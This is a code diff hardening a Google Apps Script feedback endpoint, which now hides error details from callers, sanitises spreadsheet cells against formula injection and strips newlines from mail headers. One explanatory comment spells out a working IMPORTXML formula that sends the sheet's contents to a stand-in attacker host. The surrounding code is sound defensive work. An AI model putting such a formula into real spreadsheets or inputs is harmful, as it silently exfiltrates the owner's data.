@@ -81,7 +81,11 @@ function doPost(e) {
     if (body.kind === 'feedback') return json_(handleFeedback_(body));
     return json_({ ok: false, reason: 'unknown-kind' });
   } catch (err) {
-    return json_({ ok: false, reason: 'error', detail: String(err) });
+    // Deliberately says nothing about what went wrong. The caller is anonymous and an exception
+    // string names tabs, ranges and quota states; the owner can read the real thing in
+    // Apps Script's own execution log, where it is not also being handed to whoever caused it.
+    console.error('feedback: ' + err);
+    return json_({ ok: false, reason: 'error' });
   }
 }
 
@@ -128,8 +132,9 @@ function handleFeedback_(body) {
     'when', 'game', 'email', 'message', 'who', 'version',
     'screen', 'timezone (self-reported)', 'language', 'user agent', 'came from', 'handled',
   ], [
-    new Date(), game, email, message, String(body.who || ''), String(body.version || ''),
-    c.screen || '', c.tz || '', c.lang || '', c.ua || '', c.ref || '', '',
+    new Date(), safe_(game, 60), safe_(email, MAX_EMAIL), safe_(message, MAX_MESSAGE),
+    safe_(body.who, 100), safe_(body.version, 60),
+    safe_(c.screen, 20), safe_(c.tz, 60), safe_(c.lang, 20), safe_(c.ua, 300), safe_(c.ref, 300), '',
   ]);
 
   notify_(game, email, message);
@@ -157,8 +162,8 @@ function block_(game, email, reason, body) {
   }
   var c = body.client || {};
   append_(BLOCKED_TAB, blockedHeader_(), [
-    new Date(), game, email, String(body.message || '').slice(0, MAX_MESSAGE), reason,
-    c.screen || '', c.tz || '', c.lang || '', c.ua || '',
+    new Date(), safe_(game, 60), safe_(email, MAX_EMAIL), safe_(body.message, MAX_MESSAGE), reason,
+    safe_(c.screen, 20), safe_(c.tz, 60), safe_(c.lang, 20), safe_(c.ua, 300),
   ]);
   // Answered as a success on purpose. A bot told exactly which check it failed is a bot that tries
   // the next thing; there is nothing to be gained by explaining, and a person who somehow trips one
@@ -219,11 +224,41 @@ function notify_(game, email, message) {
       to: NOTIFY_EMAIL,
       // The address goes in the subject so the inbox list is already useful, and replying to the
       // note reaches the player rather than yourself.
-      subject: 'Feedback · ' + (game || 'unknown') + ' · ' + email,
+      subject: header_('Feedback · ' + (game || 'unknown') + ' · ' + email, 160),
+      // Safe as a header because the address passed the regex above, which forbids whitespace of
+      // any kind — there is no way to fold a second header into it.
       replyTo: email,
       body: message + '\n\n— ' + email + '\n' + (book_().getUrl() || ''),
     });
   } catch (err) { /* the row is the record; a failed note is never worth losing it over */ }
+}
+
+/**
+ * EVERY value that reaches a cell goes through here. Two jobs, and the first one matters.
+ *
+ * A SPREADSHEET CELL IS A PROGRAM. `appendRow` writes a string as if it had been typed, so a
+ * message beginning `=`, `+`, `-` or `@` is stored as a live formula and evaluated in the owner's
+ * browser with the owner's authority the moment the sheet is opened. That is not a display quirk:
+ * `=IMPORTXML("https://evil.example/?x="&TEXTJOIN(",",1,A:A),"//a")` fetches an attacker's URL with
+ * the contents of this sheet appended to it. Anything a stranger can put in a cell has to be
+ * defused before it lands, and a leading apostrophe is what tells Sheets "this is text" — it is
+ * not shown in the cell, so a legitimate message starting with a minus sign still reads correctly.
+ *
+ * The second job is a length cap. The client truncates too, but the client is a suggestion: this
+ * endpoint is world-writable and a direct POST sends whatever it likes.
+ */
+function safe_(v, max) {
+  var s = String(v == null ? '' : v).slice(0, max || 300);
+  // Control characters that have no business in a cell. Tab, newline and carriage return are kept:
+  // a bug report is allowed to have paragraphs in it.
+  s = s.replace(/[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F]/g, ' ');
+  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
+  return s;
+}
+
+/** For a mail header, where a newline is not a paragraph but a second header. */
+function header_(v, max) {
+  return String(v == null ? '' : v).slice(0, max || 100).replace(/[\r\n\u0000-\u001F\u007F]/g, ' ');
 }
 
 function book_() {
